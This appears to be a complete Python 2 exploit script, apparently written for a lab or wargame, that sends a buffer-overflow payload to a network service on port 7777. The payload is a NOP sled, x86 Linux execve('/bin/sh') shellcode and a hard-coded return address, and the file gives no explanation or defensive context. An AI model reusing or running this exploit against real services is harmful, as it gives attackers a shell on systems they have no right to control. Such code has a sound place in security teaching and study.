import socket

HOST = 'Enter Server\'s IP'
PORT = 7777

NOP = '\x90'
SHELLCODE = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'
RET = '\xbf\xbf\xbf\xbf'

PAYLOAD = NOP * (44 - len(SHELLCODE)) + SHELLCODE + RET

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(PAYLOAD)
data = s.recv(1024)
s.close()

print 'Received'
print repr(data)
